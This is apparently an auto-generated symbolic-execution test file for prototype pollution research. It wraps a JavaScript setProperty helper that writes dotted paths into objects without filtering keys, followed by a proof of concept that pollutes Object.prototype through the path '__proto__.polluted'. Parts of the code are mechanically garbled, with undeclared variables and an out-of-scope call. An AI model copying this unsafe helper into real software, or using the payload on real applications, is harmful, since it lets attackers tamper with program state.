var dst___instr_array_5 = []
var dst___instr_array_5__0___instr_symb_str_7 = esl_symbolic.string("dst___instr_array_5__0___instr_symb_str_7");
dst___instr_array_5.push(dst___instr_array_5__0___instr_symb_str_7);
var dst___instr_array_5__1___instr_symb_str_8 = esl_symbolic.string("dst___instr_array_5__1___instr_symb_str_8");
dst___instr_array_5.push(dst___instr_array_5__1___instr_symb_str_8);
var dst___instr_array_5__2___instr_symb_str_9 = esl_symbolic.string("dst___instr_array_5__2___instr_symb_str_9");
dst___instr_array_5.push(dst___instr_array_5__2___instr_symb_str_9);
var path___instr_array_6 = []
var path___instr_array_6__0___instr_symb_str_10 = esl_symbolic.string("path___instr_array_6__0___instr_symb_str_10");
path___instr_array_6.push(path___instr_array_6__0___instr_symb_str_10);
var path___instr_array_6__1___instr_symb_str_11 = esl_symbolic.string("path___instr_array_6__1___instr_symb_str_11");
path___instr_array_6.push(path___instr_array_6__1___instr_symb_str_11);
var path___instr_array_6__2___instr_symb_str_12 = esl_symbolic.string("path___instr_array_6__2___instr_symb_str_12");
path___instr_array_6.push(path___instr_array_6__2___instr_symb_str_12);
var value___instr_symb_4 = esl_symbolic.string("value___instr_symb_4");

const setProperty = function (dst, path, value) {
	const setProp = function (dst, path, value) {
		var part = path.shift();
		const v1 = path.length;
		const v2 = v1 > 0;
		if (v2) {
			const v3 = dst[part];
			const v4 = {};
			const v5 = v3 || v4;
			const v6 = setProp(v5, path, value);
			dst[part] = v6;
		} else {
			var prevValue = dst[part];
			if (prevValue) {
				const v7 = [];
				const v8 = v7.concat(prevValue);
				value = v8.concat(value);
			}
			dst[part] = value;
		}
		return dst;
	};
	const v9 = typeof dst;
	const v10 = v9 !== 'object';
	if (v10) {
		const v11 = TypeError('dst must be an object');
		throw v11;
	}
	const v12 = !path;
	if (v12) {
		const v13 = TypeError('path must be specified');
		throw v13;
	}
	path = path.split('.');
	const v14 = setProp(dst, path, value);
	return v14;
};
const v15 = {};
v15['*'] = 'any';
const v16 = {};
v16['*'] = v15;
dst['*'] = v16;
dst = {};
dst = {};
const v17 = {};
const v18 = {};
v18['b'] = v17;
obj['a'] = v18;
obj = {};
obj = {};
const v19 = console.log(obj);
v19;
const v20 = setProperty(obj, 'a.b.c', 'Value After setProperty!');
v20;
const v21 = console.log(obj);
v21;
const v22 = console.log('Proof of Concept:');
v22;
const v23 = {};
const v24 = v23.polluted;
const v25 = console.log(v24);
v25;
const v26 = {};
const v27 = setProperty(v26, '__proto__.polluted', 'Hacked!');
v27;
const v28 = {};
const v29 = v28.polluted;
const v30 = console.log(v29);
v30;

setProp(dst___instr_array_5, path___instr_array_6, value___instr_symb_4);
